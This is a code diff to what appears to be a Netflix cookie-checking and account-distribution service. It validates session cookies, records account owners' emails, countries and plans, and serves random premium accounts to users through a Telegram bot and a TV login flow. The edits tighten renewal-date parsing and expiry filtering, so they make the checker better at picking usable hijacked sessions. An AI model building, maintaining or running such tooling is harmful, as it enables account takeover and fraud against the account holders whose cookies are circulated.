@@ -210,7 +210,7 @@ def decode_unicode(text):
 
 
 def parse_next_billing_date(date_str):
-    """Parse Netflix next billing date and return (formatted_str, days_left)"""
+    """Parse Netflix next billing date into ISO format and whole calendar days."""
     if not date_str or date_str == "Unknown":
         return None, None
 
@@ -242,9 +242,17 @@ def parse_next_billing_date(date_str):
         parsed_date = parsed_date.replace(tzinfo=timezone.utc)
 
     today = datetime.now(timezone.utc)
-    days_left = (parsed_date - today).days
+    # Netflix sometimes omits the year for an upcoming renewal date. Around
+    # year-end, move a date far in the past into the next calendar year.
+    if not re.search(r'\b\d{4}\b', date_str):
+        if parsed_date.date() < today.date() - timedelta(days=31):
+            try:
+                parsed_date = parsed_date.replace(year=parsed_date.year + 1)
+            except ValueError:
+                pass
+    days_left = (parsed_date.astimezone(timezone.utc).date() - today.date()).days
 
-    return date_str, days_left
+    return parsed_date.date().isoformat(), days_left
 
 
 def is_super_admin(user_id):
@@ -589,7 +597,7 @@ def check_netflix_cookie(cookie_dict):
 
         # Check 4: Billing expired
         is_expired = False
-        if days_left is not None and days_left < -3:
+        if days_left is not None and days_left < 0:
             is_expired = True
 
         # Check 5: Membership status
@@ -693,6 +701,10 @@ def check_netflix_cookie(cookie_dict):
 
         return {
             'ok': is_valid and is_premium and not is_expired,
+            'err': (
+                f'Renewal date has passed: {next_billing_str}'
+                if is_expired else None
+            ),
             'premium': is_premium,
             'email': email,
             'country': country,
@@ -832,7 +844,7 @@ def store_netflix_account(email, netflix_id, secure_netflix_id, subscription_typ
         clean_email = decode_unicode(email)
 
         # Skip clearly expired accounts
-        if is_expired and days_until_billing is not None and days_until_billing < -5:
+        if is_expired and days_until_billing is not None and days_until_billing < 0:
             logger.warning(f"Skipping expired account: {clean_email} ({days_until_billing} days)")
             return False, None
 
@@ -2132,6 +2144,7 @@ def _telegram_random_account(database_user_id, chat_id, message_id, ip_address, 
             f'👤 Account: <code>{html.escape(str(summary["email"]))}</code>\n'
             f'🌍 Country: {html.escape(str(summary["country"]))}\n'
             f'👑 Plan: {html.escape(str(summary["plan"]))}\n'
+            f'📅 Renewal: {html.escape(str(summary["renewal"] or "Not available"))}\n'
             f'🎯 Priority: {html.escape(str(tier_label))}\n'
             f'🔎 Accounts checked: {attempt}\n'
             '━━━━━━━━━━━━━━━━━━━━\n'
@@ -2400,7 +2413,7 @@ def get_accounts(user):
         for acc in accounts.data or []:
             # Extra safety: skip anything that slipped through with negative billing
             days_left = acc.get('days_until_billing')
-            if days_left is not None and days_left < -3:
+            if days_left is not None and days_left < 0:
                 continue
             
             is_ad_plan, region_compatible = get_region_compatibility(
@@ -3408,10 +3421,27 @@ def validate_netflix_cookie_quick(cookie_dict):
         
         # Check membership status
         status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
-        if status_match:
-            status = status_match.group(1)
-            if status != 'CURRENT_MEMBER':
-                return False, {'err': f'Membership status: {status}'}
+        if not status_match:
+            return False, {
+                'err': 'Temporary membership status unavailable; retry later',
+                'needs_recheck': True
+            }
+        status = status_match.group(1)
+        if status != 'CURRENT_MEMBER':
+            return False, {'err': f'Membership status: {status}'}
+
+        billing_match = re.search(r'"nextBillingDate"\s*:\s*"([^"]+)"', txt)
+        next_billing_raw = billing_match.group(1) if billing_match else None
+        next_billing_date, days_until_billing = parse_next_billing_date(
+            next_billing_raw
+        )
+        if days_until_billing is not None and days_until_billing < 0:
+            return False, {
+                'err': f'Renewal date has passed: {next_billing_date}',
+                'is_expired': True,
+                'next_billing_date': next_billing_date,
+                'days_until_billing': days_until_billing
+            }
         
         # Extract basic info
         email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', txt)
@@ -3429,7 +3459,9 @@ def validate_netflix_cookie_quick(cookie_dict):
             'email': email,
             'country': country,
             'plan': plan,
-            'is_premium': is_premium
+            'is_premium': is_premium,
+            'next_billing_date': next_billing_date,
+            'days_until_billing': days_until_billing
         }
         
     except requests.RequestException as e:
@@ -3462,7 +3494,8 @@ def _tv_account_summary(account):
         'id': account.get('id'),
         'email': account.get('email') or 'Unknown',
         'country': account.get('country') or 'Unknown',
-        'plan': account.get('plan') or account.get('subscription_type') or 'Unknown'
+        'plan': account.get('plan') or account.get('subscription_type') or 'Unknown',
+        'renewal': account.get('next_billing_date')
     }
 
 
@@ -3472,7 +3505,7 @@ def _get_random_tv_candidates(viewer_country):
     params = {
         'select': (
             'id,email,country,plan,subscription_type,netflix_id,secure_netflix_id,'
-            'days_until_billing,last_checked'
+            'days_until_billing,next_billing_date,last_checked'
         ),
         'is_active': 'eq.true',
         'is_premium': 'eq.true',
@@ -3495,7 +3528,7 @@ def _get_random_tv_candidates(viewer_country):
         if not account.get('netflix_id') or not account.get('secure_netflix_id'):
             continue
         days_left = account.get('days_until_billing')
-        if days_left is not None and days_left < -3:
+        if days_left is not None and days_left < 0:
             continue
         _, region_compatible = get_region_compatibility(
             account.get('plan'), account.get('subscription_type'), viewer_country
@@ -3571,6 +3604,10 @@ def _record_tv_validation(account, is_valid, info):
             update_data['country'] = info['country']
         if info.get('plan') and info.get('plan') != 'Unknown':
             update_data['plan'] = info['plan']
+        if info.get('next_billing_date'):
+            update_data['next_billing_date'] = info['next_billing_date']
+        if info.get('days_until_billing') is not None:
+            update_data['days_until_billing'] = info['days_until_billing']
     else:
         health_status, reason = classify_account_health({'ok': False, **(info or {})})
         update_data = {
